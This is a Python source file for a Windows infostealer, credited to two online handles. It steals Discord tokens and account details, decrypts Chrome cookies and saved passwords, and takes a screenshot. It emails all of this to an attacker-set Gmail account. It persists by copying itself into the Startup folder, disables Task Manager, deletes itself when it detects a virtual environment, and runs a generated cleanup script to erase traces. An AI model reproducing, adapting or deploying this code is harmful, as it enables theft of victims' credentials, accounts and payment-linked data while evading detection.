# Made by "nameless#2056" and destroying angel from OZ#1337"

from email.mime.nonmultipart import MIMENonMultipart
from datetime import timezone, datetime, timedelta
from email.mime.multipart import MIMEMultipart
from urllib.request import Request, urlopen
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from uuid import getnode as get_mac
from subprocess import Popen, PIPE
from Crypto.Cipher import AES
from json import loads, dumps
from base64 import b64decode
from threading import Thread
from email import encoders
from pathlib import Path
from requests import get
from time import sleep
from re import findall
import pygame.camera
from sys import argv
import pyscreenshot
import win32crypt
import pyautogui
import winshell
import keyboard
import smtplib
import sqlite3
import random
import base64
import shutil
import pygame
import time
import json
import sys
import ssl
import os

FILE_NAME = (os.path.basename(__file__))
CURRENT_PATH = os.getcwd()
USERNAME = os.getenv("USERNAME")
SYSTEM_DRIVE_LETTER = os.environ['SYSTEMDRIVE']
CURRENT_DRIVE_LETTER = CURRENT_PATH[:2]
STARTUP_LOCATION = (r'{}\\Users\\{}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup'.format(SYSTEM_DRIVE_LETTER, USERNAME))

if os.name != 'nt':
    os.remove(f'{CURRENT_PATH}\\{FILE_NAME}')
    try:
        os.system('cd .local/share/Trash/ ; cd files ; rm -rf *')
    except:
        pass
    sys.exit()
else:
    pass

if hasattr(sys, 'real_prefix'):
    os.remove(f'{CURRENT_PATH}\\{FILE_NAME}')
    try:
        winshell.recycle_bin().empty(confirm=False, show_progress=False, sound=False)
    except:
        pass
    sys.exit()
else:
    pass

try:
    os.system('REG add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /t REG_DWORD /d 1 /f')
except:
    pass

if CURRENT_PATH != STARTUP_LOCATION:
    os.system('copy ' + CURRENT_PATH + f"\\{FILE_NAME}" + ' "' + STARTUP_LOCATION + '"')
    os.remove(CURRENT_PATH + f'\\{FILE_NAME}')
    os.chdir(STARTUP_LOCATION)
    try:
        winshell.recycle_bin().empty(confirm=False, show_progress=False, sound=False)
    except:
        pass
else:
    pass

LOCAL = os.getenv("LOCALAPPDATA")
ROAMING = os.getenv("APPDATA")
PATHS = {
    "Discord": ROAMING + "\\Discord",
    "Discord Canary": ROAMING + "\\discordcanary",
    "Discord PTB": ROAMING + "\\discordptb",
    "Google Chrome": LOCAL + "\\Google\\Chrome\\User Data\\Default",
    "Opera": ROAMING + "\\Opera Software\\Opera Stable",
    "Brave": LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
    "Yandex": LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Default"
}

def getheaders(token=None, content_type="application/json"):
    headers = {
        "Content-Type": content_type,
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
    }
    if token:
        headers.update({"Authorization": token})
    return headers

def getuserdata(token):
    try:
        return loads(
            urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=getheaders(token))).read().decode())
    except:
        pass

def gettokens(path):
    path += "\\Local Storage\\leveldb"
    tokens = []
    for file_name in os.listdir(path):
        if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
            continue
        for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
            for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                for token in findall(regex, line):
                    tokens.append(token)
    return tokens

def getip():
    ip = "None"
    try:
        ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
    except:
        pass
    return ip

def getavatar(uid, aid):
    url = f"https://cdn.discordapp.com/avatars/{uid}/{aid}.gif"
    try:
        urlopen(Request(url))
    except:
        url = url[:-4]
    return url

def gethwid():
    p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
    return (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]

def getfriends(token):
    try:
        return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/relationships",
                                     headers=getheaders(token))).read().decode())
    except:
        pass

def getchat(token, uid):
    try:
        return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/channels", headers=getheaders(token),
                                     data=dumps({"recipient_id": uid}).encode())).read().decode())["id"]
    except:
        pass

def has_payment_methods(token):
    try:
        return bool(len(loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/billing/payment-sources",
                                              headers=getheaders(token))).read().decode())) > 0)
    except:
        pass

def send_message(token, chat_id, form_data):
    try:
        urlopen(Request(f"https://discordapp.com/api/v6/channels/{chat_id}/messages", headers=getheaders(token,
                                                                                                         "multipart/form-data; boundary=---------------------------325414537030329320151394843687"),
                        data=form_data.encode())).read().decode()
    except:
        pass

def spread(token, form_data, delay):
    return
    for friend in getfriends(token):
        try:
            chat_id = getchat(token, friend["id"])
            send_message(token, chat_id, form_data)
        except Exception as e:
            pass
        sleep(delay)

def main():
    cache_path = ROAMING + "\\.cache~$"
    prevent_spam = True
    self_spread = True
    embeds = []
    working = []
    checked = []
    already_cached_tokens = []
    working_ids = []
    ip = getip()
    pc_username = os.getenv("UserName")
    pc_name = os.getenv("COMPUTERNAME")
    user_path_name = os.getenv("userprofile").split("\\")[2]
    for platform, path in PATHS.items():
        if not os.path.exists(path):
            continue
        for token in gettokens(path):
            if token in checked:
                continue
            checked.append(token)
            uid = None
            if not token.startswith("mfa."):
                try:
                    uid = b64decode(token.split(".")[0].encode()).decode()
                except:
                    pass
                if not uid or uid in working_ids:
                    continue
            user_data = getuserdata(token)
            if not user_data:
                continue
            working_ids.append(uid)
            working.append(token)
            username = user_data["username"] + "#" + str(user_data["discriminator"])
            user_id = user_data["id"]
            avatar_id = user_data["avatar"]
            avatar_url = getavatar(user_id, avatar_id)
            email = user_data.get("email")
            phone = user_data.get("phone")
            nitro = bool(user_data.get("premium_type"))
            billing = bool(has_payment_methods(token))

            import platform

            INFORMATION_TO_SEND = (f'''<<<< Discord Information >>>>
Username > {username}
User ID > {user_id}
Avatar ID > {avatar_id}
Avatar URL > {avatar_url}
Email > {email}
Phone > {phone}
Nitro > {nitro}
Billing > {billing}

<<<< Basic Computer Information >>>>
Username > {USERNAME}
MAC address > {str(get_mac())}
IP address > {get("https://api.ipify.org").text}
Computer network name > {platform.node()}
Machine type > {platform.machine()}
Processor type > {platform.processor()}
Platform type > {platform.platform()}
System drive letter > {SYSTEM_DRIVE_LETTER}
Operating system > {platform.system()}
Operating system release > {platform.release()}
Operating system version > {platform.version()}
''')

            SENDER = "" # Go to https://www.google.com/settings/security/lesssecureapps and enable it so that smtp can send messages via this gmail account. This gmail account is what you will be using to send the info.
            SENDER_PASSWORD = "" # The password for the gmail account right above
            RECEIVER = "" # The email that will be receiving the info

            context = ssl.create_default_context()

            with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
                server.login(SENDER, SENDER_PASSWORD)
                server.sendmail(SENDER, RECEIVER, INFORMATION_TO_SEND)

main()

SENDER = "" # Go to https://www.google.com/settings/security/lesssecureapps and enable it so that smtp can send messages via this gmail account. This gmail account is what you will be using to send the info.
SENDER_PASSWORD = "" # The password for the gmail account right above
RECEIVER = "" # The email that will be receiving the info

try:
    def get_chrome_datetime(chromedate):
        if chromedate != 86400000000 and chromedate:
            try:
                return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
            except Exception as e:
                return chromedate
        else:
            return ""

    def get_encryption_key():
        local_state_path = os.path.join(os.environ["USERPROFILE"],
                                        "AppData", "Local", "Google", "Chrome",
                                        "User Data", "Local State")
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = f.read()
            local_state = json.loads(local_state)

        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        key = key[5:]
        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
        
    def decrypt_data(data, key):
        try:
            iv = data[3:15]
            data = data[15:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            return cipher.decrypt(data)[:-16].decode()
        except:
            try:
                return str(win32crypt.CryptUnprotectData(data, None, None, None, 0)[1])
            except:
                return ""
                
    def main():
        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                                "Google", "Chrome", "User Data", "default", "Cookies")
        filename = "Cookies.db"
        if not os.path.isfile(filename):
            shutil.copyfile(db_path, filename)
            
        db = sqlite3.connect(filename)
        cursor = db.cursor()
        cursor.execute("""
        SELECT host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value 
        FROM cookies""")
        key = get_encryption_key()
        for host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value in cursor.fetchall():
            if not value:
                decrypted_value = decrypt_data(encrypted_value, key)
            else:
                decrypted_value = value
            COOKIES = open("cook.txt", "+w")
            COOKIES.write(f"Host: {host_key}\\nCookie name: {name}\\nCookie value (decrypted): {decrypted_value}\\nCreation datetime (UTC): {get_chrome_datetime(creation_utc)}\\nLast access datetime (UTC): {get_chrome_datetime(last_access_utc)}\\nExpires datetime (UTC): {get_chrome_datetime(expires_utc)}\\n==============================================================\\n")
            COOKIES.close()
            
            LINE = open('cook.txt', 'r')
            for LINE in LINE:
                new_cook = open('new_cook.txt', '+a')
                new_cook.write(LINE)
                new_cook.close()
            
            cursor.execute("""
            UPDATE cookies SET value = ?, has_expires = 1, expires_utc = 99999999999999999, is_persistent = 1, is_secure = 0
            WHERE host_key = ?
            AND name = ?""", (decrypted_value, host_key, name))
        db.commit()
        db.close()

        email_send = "" # Go to https://www.google.com/settings/security/lesssecureapps and enable it so that smtp can send messages via this gmail account. This gmail account is what you will be using to send the info.
        email_send_password = "" # The password for the gmail account right above
        email_recv = "" # The email that will be receiving the info
        subject = "subject"
        
        msg = MIMEMultipart()
        msg['From'] = email_recv
        msg['To'] = email_send
        msg['Subject'] = subject
        
        body = ""
        msg.attach(MIMEText (body, "plain"))
        
        filename = "new_cook.txt"
        attachment = open(filename, "rb")
        
        part = MIMEBase("application", "octet-stream")
        part.set_payload((attachment).read())
        encoders.encode_base64(part)
        part.add_header("Content-Disposition", "attachment; filename= " + filename)
        
        msg.attach(part)
        text = msg.as_string()
        server = smtplib.SMTP("smtp.gmail.com:587")
        server.starttls()
        server.login(email_send, email_send_password)
        
        server.sendmail(email_send, email_recv, text)
        server.quit()

    if __name__ == "__main__":
        main()
except:
    pass

def get_chrome_datetime(chromedate):
    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)

def get_encryption_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"],
                                    "AppData", "Local", "Google", "Chrome",
                                    "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)

    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    key = key[5:]
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

def decrypt_password(password, key):
    try:
        iv = password[3:15]
        password = password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(password)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            return ""

def main():
    key = get_encryption_key()
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                            "Google", "Chrome", "User Data", "default", "Login Data")
    filename = "ChromeData.db"
    shutil.copyfile(db_path, filename)
    db = sqlite3.connect(filename)
    cursor = db.cursor()
    cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
    for row in cursor.fetchall():
        origin_url = row[0]
        action_url = row[1]
        username = row[2]
        password = decrypt_password(row[3], key)
        date_created = row[4]
        date_last_used = row[5]

        PASSWORDS = open("Passwords.txt", "+w")
        PASSWORDS.write(f"Origin URL: {origin_url}\nAction URL: {action_url}\nUsername: {username}\nPassword: {password}\nCreation date: {str(get_chrome_datetime(date_created))}\nLast Used: {str(get_chrome_datetime(date_last_used))}\n==================================================\n\n")
        PASSWORDS.close()

        LINE = open('Passwords.txt', 'r')
        for LINE in LINE:
            new_pass = open('new_pass.txt', '+a')
            new_pass.write(LINE)
            new_pass.close()

    cursor.close()
    db.close()

    email_send = "" # Go to https://www.google.com/settings/security/lesssecureapps and enable it so that smtp can send messages via this gmail account. This gmail account is what you will be using to send the info.
    email_send_password = "" # The password for the gmail account right above
    email_recv = "" # The email that will be receiving the info
    subject = "subject"
      
    msg = MIMEMultipart()
    msg['From'] = email_recv
    msg['To'] = email_send
    msg['Subject'] = subject
    
    body = ""
    msg.attach(MIMEText (body, "plain"))
    
    filename = "new_pass.txt"
    attachment = open(filename, "rb")
    
    part = MIMEBase("application", "octet-stream")
    part.set_payload((attachment).read())
    encoders.encode_base64(part)
    part.add_header("Content-Disposition", "attachment; filename= " + filename)
    
    msg.attach(part)
    text = msg.as_string()
    server = smtplib.SMTP("smtp.gmail.com:587")
    server.starttls()
    server.login(email_send, email_send_password)
    
    server.sendmail(email_send, email_recv, text)
    server.quit()

    try:
        os.remove(filename)
    except:
        pass

if __name__ == "__main__":
    main()

image = pyscreenshot.grab()
image.save('ss.png')
image.close()

msg = MIMEMultipart()
msg['From'] = RECEIVER
msg['To'] = SENDER
msg['Subject'] = 'Screen shot'

body = ""
msg.attach(MIMEText (body, "plain"))

filename = "ss.png"
attachment = open(filename, "rb")

part = MIMEBase("application", "octet-stream")
part.set_payload((attachment).read())
encoders.encode_base64(part)
part.add_header("Content-Disposition", "attachment; filename= " + filename)

msg.attach(part)
text = msg.as_string()
server = smtplib.SMTP("smtp.gmail.com:587")
server.starttls()
server.login(SENDER, SENDER_PASSWORD)

server.sendmail(SENDER, RECEIVER, text)
server.quit()

MAKE_REMOVE_FILES = open('remove_files.py', 'w', encoding='utf-8')
MAKE_REMOVE_FILES.write('''from pathlib import Path
import winshell
import os

CURRENT_PATH = os.getcwd()
USERNAME = os.getenv("USERNAME")
SYSTEM_DRIVE_LETTER = os.environ['SYSTEMDRIVE']
CURRENT_DRIVE_LETTER = CURRENT_PATH[:2]
STARTUP_LOCATION = (r'{}\\Users\\{}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup'.format(SYSTEM_DRIVE_LETTER, USERNAME))

ChromeData = Path(STARTUP_LOCATION + '\\ChromeData.db')
for _ in range(1):
    if ChromeData.is_file():
        os.remove('ChromeData.db')
    else:
        pass

cook = Path(STARTUP_LOCATION + '\\cook.txt')
for _ in range(1):
    if cook.is_file():
        os.remove('cook.txt')
    else:
        pass

Cookies = Path(STARTUP_LOCATION + '\\Cookies.db')
for _ in range(1):
    if Cookies.is_file():
        os.remove('Cookies.db')
    else:
        pass

Passwords = Path(STARTUP_LOCATION + '\\Passwords.txt')
for _ in range(1):
    if Passwords.is_file():
        os.remove('Passwords.txt')
    else:
        pass

ss = Path(STARTUP_LOCATION + '\\ss.png')
for _ in range(1):
    if ss.is_file():
        os.remove('ss.png')
    else:
        pass

new_cook = Path(STARTUP_LOCATION + '\\new_cook.txt')
for _ in range(1):
    if new_cook.is_file():
        os.remove('new_cook.txt')
    else:
        pass

new_pass = Path(STARTUP_LOCATION + '\\new_pass.txt')
for _ in range(1):
    if new_pass.is_file():
        os.remove('new_pass.txt')
    else:
        pass

FILE_NAME = (os.path.basename(__file__))
DIRECTORY = os.getcwd()
os.remove(f'{DIRECTORY}\\{FILE_NAME}')
try:
    winshell.recycle_bin().empty(confirm=False, show_progress=False, sound=False)
except:
    pass
''')
MAKE_REMOVE_FILES.close()

os.startfile('remove_files.py')

os.remove('new_cook.txt')
os.remove('new_pass.txt')
